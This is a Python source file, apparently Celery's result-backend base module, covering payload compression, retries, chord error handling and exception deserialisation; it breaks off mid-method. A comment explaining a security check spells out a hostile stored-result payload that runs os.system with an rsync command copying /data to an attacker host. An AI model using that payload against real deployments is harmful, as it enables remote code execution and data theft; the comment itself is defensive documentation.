"""Result backend base classes.

- :class:`BaseBackend` defines the interface.

- :class:`KeyValueStoreBackend` is a common base class
    using K/V semantics like _get and _put.
"""
import sys
import threading
import time
import warnings
from collections import deque, namedtuple
from contextlib import contextmanager
from datetime import datetime, timedelta
from functools import partial
from uuid import UUID
from weakref import WeakValueDictionary

from billiard.einfo import ExceptionInfo
from kombu.compression import compress, decompress
from kombu.compression import encoders as compression_encoders
from kombu.compression import get_encoder as get_compression_encoder
from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import celery.exceptions
from celery import current_app, group, maybe_signature, states
from celery._state import get_current_task
from celery.app.task import Context
from celery.backends.governance import (E_GOVERNANCE_DISABLED, E_GOVERNANCE_UNSUPPORTED, CleanupFilters,
                                        CleanupReport, ResultInventory, ResultInventoryItem, ScannedValue,
                                        StateUsage, StoredResult, coerce_time_window, normalize_value_set,
                                        parse_date_done, prepare_capacity_limit, prepare_retention_policy)
from celery.exceptions import (BackendGetMetaError, BackendStoreError, ChordError, ImproperlyConfigured,
                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)
from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
from celery.utils.collections import BufferMap
from celery.utils.functional import LRUCache, arity_greater
from celery.utils.log import get_logger
from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
                                        get_pickled_exception, raise_with_context)
from celery.utils.time import get_exponential_backoff_interval

__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

#: Marker prepended to compressed result payloads.
#:
#: Unlike a task message, a stored result has nowhere to keep the
#: ``compression`` header that Kombu uses to tell a consumer how a body was
#: compressed, because backends store the payload as a single opaque value.
#: The compression type therefore travels in-band, in front of the compressed
#: body: ``MAGIC + content-type + b'\0' + body``.
#:
#: The leading NUL byte cannot start the output of any serializer Celery
#: ships with (JSON and YAML are text, pickle starts with an opcode, and
#: msgpack encodes a mapping with a byte in the ``0x80``-``0xdf`` range), so a
#: payload written before compression was turned on is never mistaken for a
#: compressed one.
COMPRESSED_PAYLOAD_MAGIC = b'\x00celery-compressed\x00'

logger = get_logger(__name__)

MESSAGE_BUFFER_MAX = 8192

pending_results_t = namedtuple('pending_results_t', (
    'concrete', 'weak',
))

E_NO_BACKEND = """
No result backend is configured.
Please see the documentation for more information.
"""

E_CHORD_NO_BACKEND = """
Starting chords requires a result backend to be configured.

Note that a group chained with a task is also upgraded to be a chord,
as this pattern requires synchronization.

Result backends that supports chords: Redis, Database, Memcached, and more.
"""

E_UNKNOWN_COMPRESSION = """\
Unknown compression method {0!r} configured in result_compression.
Available methods are: {1}.
"""

W_COMPRESSION_UNSUPPORTED = """\
The {0} result backend cannot store compressed payloads, so the
result_compression setting is ignored and results are stored uncompressed.
"""


def compress_payload(payload, compression):
    """Compress an encoded result payload.

    The returned payload describes its own compression method, so
    :func:`decompress_payload` can undo this without being told which
    method was used.

    Arguments:
        payload (AnyStr): An encoded result payload.
        compression (str): Name of a method in the Kombu compression
            registry, for example ``'gzip'``.
    """
    body, content_type = compress(payload, compression)
    return b''.join([
        COMPRESSED_PAYLOAD_MAGIC, content_type.encode('utf-8'), b'\x00', body,
    ])


def decompress_payload(payload):
    """Decompress a payload written by :func:`compress_payload`.

    Payloads that don't carry the marker are returned as they are, so
    results stored before compression was enabled are still readable, and
    payloads that do carry it are decompressed even when the reader has no
    compression of its own configured.
    """
    if isinstance(payload, memoryview):
        payload = payload.tobytes()
    if not isinstance(payload, (bytes, bytearray)):
        return payload
    if not payload.startswith(COMPRESSED_PAYLOAD_MAGIC):
        return payload
    content_type, _, body = payload[
        len(COMPRESSED_PAYLOAD_MAGIC):].partition(b'\x00')
    return decompress(body, content_type.decode('utf-8'))


def unpickle_backend(cls, args, kwargs):
    """Return an unpickled backend."""
    return cls(*args, app=current_app._get_current_object(), **kwargs)


def _create_chord_error_with_cause(message, original_exc=None) -> ChordError:
    """Create a ChordError preserving the original exception as __cause__.

    This helper reduces code duplication across the codebase when creating
    ChordError instances that need to preserve the original exception.
    """
    chord_error = ChordError(message)
    if isinstance(original_exc, Exception):
        chord_error.__cause__ = original_exc
    return chord_error


def _create_fake_task_request(task_id, errbacks=None, task_name='unknown', **extra) -> Context:
    """Create a fake task request context for error callbacks.

    This helper reduces code duplication when creating fake request contexts
    for error callback handling.
    """
    return Context({
        "id": task_id,
        "errbacks": errbacks or [],
        "delivery_info": dict(),
        "task": task_name,
        **extra
    })


class _nulldict(dict):
    def ignore(self, *a, **kw):
        pass

    __setitem__ = update = setdefault = ignore


def _is_request_ignore_result(request):
    if request is None:
        return False
    return request.ignore_result


class Backend:
    READY_STATES = states.READY_STATES
    UNREADY_STATES = states.UNREADY_STATES
    EXCEPTION_STATES = states.EXCEPTION_STATES

    TimeoutError = TimeoutError

    #: Time to sleep between polling each individual item
    #: in `ResultSet.iterate`. as opposed to the `interval`
    #: argument which is for each pass.
    subpolling_interval = None

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire results.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    #: If true the backend can store a result payload that has been
    #: compressed, which means storing and returning arbitrary bytes
    #: unchanged.  Backends that put the payload inside a JSON document, or
    #: that decode it to text on the way out, can't, and the
    #: :setting:`result_compression` setting is ignored for them.
    supports_result_compression = False

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, app,
                 serializer=None, max_cached_results=None, accept=None,
                 expires=None, expires_type=None, url=None, **kwargs):
        self.app = app
        conf = self.app.conf
        self.serializer = serializer or conf.result_serializer
        (self.content_type,
         self.content_encoding,
         self.encoder) = serializer_registry._encoders[self.serializer]
        self.compression = self.prepare_compression(
            conf.get('result_compression'))
        cmax = max_cached_results or conf.result_cache_max
        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)

        self.expires = self.prepare_expires(expires, expires_type)

        # precedence: accept, conf.result_accept_content, conf.accept_content
        self.accept = conf.result_accept_content if accept is None else accept
        self.accept = conf.accept_content if self.accept is None else self.accept
        self.accept = prepare_accept_content(self.accept)

        self.always_retry = conf.get('result_backend_always_retry', False)
        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
        self.max_retries = conf.get('result_backend_max_retries', float("inf"))
        self.thread_safe = conf.get('result_backend_thread_safe', False)

        self._pending_results = pending_results_t({}, WeakValueDictionary())
        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
        self.url = url

    def as_uri(self, include_password=False):
        """Return the backend as an URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self, task_id, **meta):
        """Mark a task as started."""
        return self.store_result(task_id, meta, states.STARTED)

    def mark_as_done(self, task_id, result,
                     request=None, store_result=True, state=states.SUCCESS):
        """Mark task as successfully executed."""
        if (store_result and not _is_request_ignore_result(request)):
            self.store_result(task_id, result, state, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, result)

    def mark_as_failure(self, task_id, exc,
                        traceback=None, request=None,
                        store_result=True, call_errbacks=True,
                        state=states.FAILURE):
        """Mark task as executed with failure."""
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=traceback, request=request)
        if request:
            # This task may be part of a chord
            if request.chord:
                self.on_chord_part_return(request, state, exc)
            # It might also have chained tasks which need to be propagated to,
            # this is most likely to be exclusive with being a direct part of a
            # chord but we'll handle both cases separately.
            #
            # The `chain_data` try block here is a bit tortured since we might
            # have non-iterable objects here in tests and it's easier this way.
            try:
                chain_data = iter(request.chain)
            except (AttributeError, TypeError):
                chain_data = tuple()
            chain_elems = deque(chain_data)
            while chain_elems:
                chain_elem = chain_elems.popleft()
                # Reconstruct a `Context` object for the chained task which has
                # enough information to for backends to work with
                chain_elem_ctx = Context(chain_elem)
                chain_elem_ctx.update(chain_elem_ctx.options)
                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')
                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')
                # If the state should be propagated, we'll do so for all
                # elements of the chain. This is only truly important so
                # that the last chain element which controls completion of
                # the chain itself is marked as completed to avoid stalls.
                #
                # Some chained elements may be complex signatures and have no
                # task ID of their own, so we skip them hoping that not
                # descending through them is OK. If the last chain element is
                # complex, we assume it must have been uplifted to a chord by
                # the canvas code and therefore the condition below will ensure
                # that we mark something as being complete as avoid stalling.
                if (
                    store_result and state in states.PROPAGATE_STATES and
                    chain_elem_ctx.id is not None
                ):
                    self.store_result(
                        chain_elem_ctx.id, exc, state,
                        traceback=traceback, request=chain_elem_ctx,
                    )
                # If the chain element is a member of a chord, we also need
                # to call `on_chord_part_return()` as well to avoid stalls.
                if 'chord' in chain_elem_ctx.options:
                    self.on_chord_part_return(chain_elem_ctx, state, exc)
                # A chord step completes only when its body does, so the
                # result that later steps and any enclosing chord wait on is
                # the chord body, not the chord's own id. Descend into it so
                # the failure reaches that result (see issue #9674).
                if getattr(chain_elem_ctx, 'subtask_type', None) == 'chord':
                    chord_body = (chain_elem_ctx.kwargs or {}).get('body')
                    if chord_body is not None:
                        chain_elems.append(chord_body)
            # And finally we'll fire any errbacks
            if call_errbacks and request.errbacks:
                self._call_task_errbacks(request, exc, traceback)

    def _call_task_errbacks(self, request, exc, traceback):
        old_signature = []
        for errback in request.errbacks:
            errback = self.app.signature(errback)
            if not errback._app:
                # Ensure all signatures have an application
                errback._app = self.app
            try:
                if (
                        # Celery tasks type created with the @task decorator have
                        # the __header__ property, but Celery task created from
                        # Task class do not have this property.
                        # That's why we have to check if this property exists
                        # before checking is it partial function.
                        hasattr(errback.type, '__header__') and

                        # workaround to support tasks with bind=True executed as
                        # link errors. Otherwise, retries can't be used
                        not isinstance(errback.type.__header__, partial) and
                        arity_greater(errback.type.__header__, 1)
                ):
                    try:
                        errback(request, exc, traceback)
                    except Exception:
                        logger.exception(
                            'Errback %r raised an exception',
                            errback.name,
                        )
                else:
                    old_signature.append(errback)
            except NotRegistered:
                # Task may not be present in this worker.
                # We simply send it forward for another worker to consume.
                # If the task is not registered there, the worker will raise
                # NotRegistered.
                old_signature.append(errback)

        if old_signature:
            # Previously errback was called as a task so we still
            # need to do so if the errback only takes a single task_id arg.
            task_id = request.id
            root_id = request.root_id or task_id
            g = group(old_signature, app=self.app)
            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):
                g.apply(
                    (task_id,), parent_id=task_id, root_id=root_id
                )
            else:
                g.apply_async(
                    (task_id,), parent_id=task_id, root_id=root_id
                )

    def mark_as_revoked(self, task_id, reason='',
                        request=None, store_result=True, state=states.REVOKED):
        exc = TaskRevokedError(reason)
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=None, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, exc)

    def mark_as_retry(self, task_id, exc, traceback=None,
                      request=None, store_result=True, state=states.RETRY):
        """Mark task as being retries.

        Note:
            Stores the current exception (if any).
        """
        return self.store_result(task_id, exc, state,
                                 traceback=traceback, request=request)

    def chord_error_from_stack(self, callback, exc=None):
        app = self.app

        try:
            backend = app._tasks[callback.task].backend
        except KeyError:
            backend = self

        # Handle group callbacks specially to prevent hanging body tasks
        if isinstance(callback, group):
            return self._handle_group_chord_error(group_callback=callback, backend=backend, exc=exc)

        # Generate an ID if missing so the error can be stored.
        callback_id = callback.id
        if not callback_id:
            from kombu.utils.uuid import uuid
            callback_id = callback.options['task_id'] = uuid()

        # We have to make a fake request since either the callback failed or
        # we're pretending it did since we don't have information about the
        # chord part(s) which failed. This request is constructed as a best
        # effort for new style errbacks and may be slightly misleading about
        # what really went wrong, but at least we call them!
        fake_request = _create_fake_task_request(
            task_id=callback.options.get("task_id"),
            errbacks=callback.options.get("link_error", []),
            **callback
        )
        try:
            self._call_task_errbacks(fake_request, exc, None)
        except Exception as eb_exc:  # pylint: disable=broad-except
            return backend.fail_from_current_stack(callback_id, exc=eb_exc)
        else:
            return backend.fail_from_current_stack(callback_id, exc=exc)

    def _handle_group_chord_error(self, group_callback, backend, exc=None):
        """Handle chord errors when the callback is a group.

        When a chord header fails and the body is a group, we need to:
        1. Revoke all pending tasks in the group body
        2. Mark them as failed with the chord error
        3. Call error callbacks for each task

        This prevents the group body tasks from hanging indefinitely (#8786)
        """

        # Extract original exception from ChordError if available
        if isinstance(exc, ChordError) and hasattr(exc, '__cause__') and exc.__cause__:
            original_exc = exc.__cause__
        else:
            original_exc = exc

        try:
            # Freeze the group to get the actual GroupResult with task IDs
            frozen_group = group_callback.freeze()

            if isinstance(frozen_group, GroupResult):
                # revoke all tasks in the group to prevent execution
                frozen_group.revoke()

                # Handle each task in the group individually
                for result in frozen_group.results:
                    try:
                        # Create fake request for error callbacks
                        fake_request = _create_fake_task_request(
                            task_id=result.id,
                            errbacks=group_callback.options.get("link_error", []),
                            task_name=getattr(result, 'task', 'unknown')
                        )

                        # Call error callbacks for this task with original exception
                        try:
                            backend._call_task_errbacks(fake_request, original_exc, None)
                        except Exception:  # pylint: disable=broad-except
                            # continue on exception to be sure to iter to all the group tasks
                            pass

                        # Mark the individual task as failed with original exception
                        backend.fail_from_current_stack(result.id, exc=original_exc)

                    except Exception as task_exc:  # pylint: disable=broad-except
                        # Log error but continue with other tasks
                        logger.exception(
                            'Failed to handle chord error for task %s: %r',
                            getattr(result, 'id', 'unknown'), task_exc
                        )

                # Also mark the group itself as failed if it has an ID
                frozen_group_id = getattr(frozen_group, 'id', None)
                if frozen_group_id:
                    backend.mark_as_failure(frozen_group_id, original_exc)

            return None

        except Exception as cleanup_exc:  # pylint: disable=broad-except
            # Log the error and fall back to single task handling
            logger.exception(
                'Failed to handle group chord error, falling back to single task handling: %r',
                cleanup_exc
            )
            # Fallback to original error handling
            return backend.fail_from_current_stack(group_callback.id, exc=exc)

    def fail_from_current_stack(self, task_id, exc=None):
        type_, real_exc, tb = sys.exc_info()
        try:
            exc = real_exc if exc is None else exc
            exception_info = ExceptionInfo((type_, exc, tb))
            self.mark_as_failure(task_id, exc, exception_info.traceback)
            return exception_info
        finally:
            while tb is not None:
                try:
                    tb.tb_frame.clear()
                    tb.tb_frame.f_locals
                except RuntimeError:
                    # Ignore the exception raised if the frame is still executing.
                    pass
                tb = tb.tb_next

            del tb

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(
                exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type,
                                           celery.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the result
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(
                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def prepare_value(self, result):
        """Prepare value for storage."""
        if self.serializer != 'pickle' and isinstance(result, ResultBase):
            return result.as_tuple()
        return result

    def encode(self, data):
        _, _, payload = self._encode(data)
        if self.compression:
            payload = compress_payload(payload, self.compression)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES:
            meta['result'] = self.exception_to_python(meta['result'])
        return meta

    def decode_result(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        # Driven by the payload itself rather than by ``self.compression`` so
        # that a result stays readable after the setting is turned off again,
        # and so that a reader that never had it turned on can still read a
        # result written by a worker that did.
        payload = decompress_payload(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_compression(self, compression):
        """Return the compression method to encode results with.

        Returns :const:`None` when results should be stored uncompressed,
        either because nothing was configured or because this backend can't
        hold a compressed payload.
        """
        if not compression:
            return None
        if not self.supports_result_compression:
            warnings.warn(
                W_COMPRESSION_UNSUPPORTED.format(type(self).__name__),
                UserWarning,
            )
            return None
        try:
            get_compression_encoder(compression)
        except KeyError as e:
            raise ImproperlyConfigured(E_UNKNOWN_COMPRESSION.format(
                compression,
                ', '.join(sorted(compression_encoders())))) from e
        return compression

    def prepare_expires(self, value, type=None):
        if value is None:
            value = self.app.conf.result_expires
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and type:
            return type(value)
        return value

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.app.conf.result_persistent
        return self.persistent if persistent is None else persistent

    def encode_result(self, result, state):
        if state in self.EXCEPTION_STATES and isinstance(result, BaseException):
            return self.prepare_exception(result)
        return self.prepare_value(result)

    def is_cached(self, task_id):
        return task_id in self._cache

    def _get_result_meta(self, result,
                         state, traceback, request, format_date=True,
                         encode=False):
        if state in self.READY_STATES:
            date_done = self.app.now()
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None

        meta = {
            'status': state,
            'result': result,
            'traceback': traceback,
            'children': self.current_task_children(request),
            'date_done': date_done,
        }

        if request and getattr(request, 'group', None):
            meta['group_id'] = request.group
        if request and getattr(request, 'parent_id', None):
            meta['parent_id'] = request.parent_id

        if self.app.conf.find_value_for_key('extended', 'result'):
            if request:
                request_meta = {
                    'name': getattr(request, 'task', None),
                    'args': getattr(request, 'args', None),
                    'kwargs': getattr(request, 'kwargs', None),
                    'worker': getattr(request, 'hostname', None),
                    'retries': getattr(request, 'retries', None),
                    'queue': request.delivery_info.get('routing_key')
                    if hasattr(request, 'delivery_info') and
                    request.delivery_info else None,
                }
                if getattr(request, 'stamps', None):
                    request_meta['stamped_headers'] = request.stamped_headers
                    request_meta.update(request.stamps)

                if encode:
                    # args and kwargs need to be encoded properly before saving
                    encode_needed_fields = {"args", "kwargs"}
                    for field in encode_needed_fields:
                        value = request_meta[field]
                        encoded_value = self.encode(value)
                        request_meta[field] = ensure_bytes(encoded_value)

                meta.update(request_meta)

        return meta

    def _sleep(self, amount):
        time.sleep(amount)

    def _ensure_retryable(self, func, *args, fallback_exc=None, fallback_msg=None, **kwargs):
        """Helper to execute a function with the backend's retry policy."""
        retries = 0
        while True:
            try:
                return func(*args, **kwargs)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1
                        logger.warning(
                            'Failed operation %s. Retrying %s more times.',
                            getattr(func, '__name__', repr(func)), self.max_retries - retries,
                            exc_info=True)
                        try:
                            self.on_backend_retryable_error(exc)
                        except Exception:
                            logger.exception(
                                "on_backend_retryable_error hook failed; continuing retry loop",
                            )

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        if fallback_exc:
                            exc_kwargs = {}
                            for key in ("task_id", "state"):
                                if key in kwargs:
                                    exc_kwargs[key] = kwargs[key]
                            raise_with_context(fallback_exc(fallback_msg, **exc_kwargs))
                        raise
                else:
                    raise

    def store_result(self, task_id, result, state,
                     traceback=None, request=None, **kwargs):
        """Update task state and result.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        result = self.encode_result(result, state)

        kwargs.update({'task_id': task_id, 'state': state})

        self._ensure_retryable(
            self._store_result,
            fallback_exc=BackendStoreError,
            fallback_msg="failed to store result on the backend",
            result=result,
            traceback=traceback,
            request=request,
            **kwargs
        )
        return result

    def forget(self, task_id):
        self._cache.pop(task_id, None)
        self._ensure_retryable(self._forget, task_id=task_id)

    def _forget(self, task_id):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self, task_id):
        """Get the state of a task."""
        return self.get_task_meta(task_id)['status']

    get_status = get_state  # XXX compat

    def get_traceback(self, task_id):
        """Get the traceback for a failed task."""
        return self.get_task_meta(task_id).get('traceback')

    def get_result(self, task_id):
        """Get the result of a task."""
        return self.get_task_meta(task_id).get('result')

    def get_children(self, task_id):
        """Get the list of subtasks sent by a task."""
        try:
            return self.get_task_meta(task_id)['children']
        except KeyError:
            pass

    def _ensure_not_eager(self):
        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
            warnings.warn(
                "Results are not stored in backend and should not be retrieved when "
                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                RuntimeWarning,
                stacklevel=2,
            )

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def on_backend_retryable_error(self, exc):
        """Hook called before retrying a recoverable backend exception."""
        return None

    def get_task_meta(self, task_id, cache=True):
        """Get task meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[task_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(
            self._get_task_meta_for,
            fallback_exc=BackendGetMetaError,
            fallback_msg="failed to get meta",
            task_id=task_id
        )

        if cache and meta.get('status') == states.SUCCESS:
            self._cache[task_id] = meta
        return meta

    def reload_task_result(self, task_id):
        """Reload task result, even if it has been previously fetched."""
        self._cache[task_id] = self.get_task_meta(task_id, cache=False)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return self._get_task_meta_for(task_id)["status"] != states.PENDING

    def reload_group_result(self, group_id):
        """Reload group result, even if it has been previously fetched."""
        self._cache[group_id] = self.get_group_meta(group_id, cache=False)

    def get_group_meta(self, group_id, cache=True):
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[group_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(self._restore_group, group_id=group_id)
        if cache and meta is not None:
            self._cache[group_id] = meta
        return meta

    def restore_group(self, group_id, cache=True):
        """Get the result for a group."""
        meta = self.get_group_meta(group_id, cache=cache)
        if meta:
            return meta['result']

    def save_group(self, group_id, result):
        """Store the result of an executed group."""
        return self._ensure_retryable(
            self._save_group,
            group_id=group_id,
            result=result
        )

    def delete_group(self, group_id):
        self._cache.pop(group_id, None)
        return self._ensure_retryable(self._delete_group, group_id=group_id)

    def cleanup(self):
        """Backend cleanup."""

    def process_cleanup(self):
        """Cleanup actions to do at the end of a task worker process."""

    def on_task_call(self, producer, task_id):
        return {}

    def add_to_chord(self, chord_id, result):
        raise NotImplementedError('Backend does not support add_to_chord')

    def on_chord_part_return(self, request, state, result, **kwargs):
        pass

    def set_chord_size(self, group_id, chord_size):
        pass

    def fallback_chord_unlock(self, header_result, body, countdown=1,
                              **kwargs):
        kwargs['result'] = [r.as_tuple() for r in header_result]
        try:
            body_type = getattr(body, 'type', None)
        except NotRegistered:
            body_type = None

        queue = body.options.get('queue', getattr(body_type, 'queue', None))

        if queue is None:
            # fallback to default routing if queue name was not
            # explicitly passed to body callback
            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name

        priority = body.options.get('priority', getattr(body_type, 'priority', 0))

        stamps = body.options.get('stamped_headers', ())
        routing_options = {}
        for option in ('exchange', 'exchange_type', 'routing_key', 'headers'):
            if option in stamps:
                continue
            value = body.options.get(option)
            if value is not None:
                routing_options[option] = value

        if 'exchange_type' not in routing_options:
            try:
                queue_obj = self.app.amqp.queues[queue] if isinstance(queue, str) else queue
                routing_options['exchange_type'] = queue_obj.exchange.type
            except (AttributeError, KeyError):
                pass
        if 'exchange_type' in routing_options:
            # unlock_chord needs this for retries.
            kwargs['_chord_unlock_exchange_type'] = routing_options['exchange_type']

        self.app.tasks['celery.chord_unlock'].apply_async(
            (header_result.id, body,), kwargs,
            countdown=countdown,
            queue=queue,
            priority=priority,
            **routing_options,
        )

    def ensure_chords_allowed(self):
        pass

    def apply_chord(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        self.fallback_chord_unlock(header_result, body, **kwargs)

    def current_task_children(self, request=None):
        request = request or getattr(get_current_task(), 'request', None)
        if request:
            return [r.as_tuple() for r in getattr(request, 'children', [])]

    def __reduce__(self, args=(), kwargs=None):
        kwargs = {} if not kwargs else kwargs
        return (unpickle_backend, (self.__class__, args, kwargs))


class SyncBackendMixin:
    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,
                    on_message=None, on_interval=None):
        self._ensure_not_eager()
        results = result.results
        if not results:
            return

        task_ids = set()
        for result in results:
            if isinstance(result, ResultSet):
                yield result.id, result.results
            else:
                task_ids.add(result.id)

        yield from self.get_many(
            task_ids,
            timeout=timeout, interval=interval, no_ack=no_ack,
            on_message=on_message, on_interval=on_interval,
        )

    def wait_for_pending(self, result, timeout=None, interval=0.5,
                         no_ack=True, on_message=None, on_interval=None,
                         callback=None, propagate=True):
        self._ensure_not_eager()
        if on_message is not None:
            raise ImproperlyConfigured(
                'Backend does not support on_message callback')

        meta = self.wait_for(
            result.id, timeout=timeout,
            interval=interval,
            on_interval=on_interval,
            no_ack=no_ack,
        )
        if meta:
            result._maybe_set_cache(meta)
            return result.maybe_throw(propagate=propagate, callback=callback)

    def wait_for(self, task_id,
                 timeout=None, interval=0.5, no_ack=True, on_interval=None):
        """Wait for task and return its result.

        If the task raises an exception, this exception
        will be re-raised by :func:`wait_for`.

        Raises:
            celery.exceptions.TimeoutError:
                If `timeout` is not :const:`None`, and the operation
                takes longer than `timeout` seconds.
        """
        self._ensure_not_eager()

        time_elapsed = 0.0

        while 1:
            meta = self.get_task_meta(task_id)
            if meta['status'] in states.READY_STATES:
                return meta
            if on_interval:
                on_interval()
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError('The operation timed out.')
            # avoid hammering the CPU checking status. Never sleep past the
            # deadline: with the sleep first, timeout=0 blocked for a whole
            # interval before giving up, and any timeout below interval
            # overshot to interval.
            nap = interval if timeout is None else min(interval, timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap

    def add_pending_result(self, result, weak=False):
        return result

    def remove_pending_result(self, result):
        return result

    @property
    def is_async(self):
        return False


class BaseBackend(Backend, SyncBackendMixin):
    """Base (synchronous) result backend."""


BaseDictBackend = BaseBackend  # XXX compat


class BaseKeyValueStoreBackend(Backend):
    key_t = ensure_bytes
    task_keyprefix = 'celery-task-meta-'
    group_keyprefix = 'celery-taskset-meta-'
    chord_keyprefix = 'chord-unlock-'
    implements_incr = False

    #: Set to true by backends that can enumerate their own result keys,
    #: which is what storage-side capacity governance relies on.
    supports_capacity_governance = False

    #: Name (under the keyprefixes) of the cross-process governance lock.
    governance_lock_suffix = 'celery-governance-lock'

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._add_global_keyprefix()
        self._encode_prefixes()
        self._init_governance()
        if self.implements_incr:
            self.apply_chord = self._apply_chord_incr

    def _add_global_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
        """
        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
        if global_keyprefix:
            if global_keyprefix[-1] not in ':_-.':
                global_keyprefix += '_'
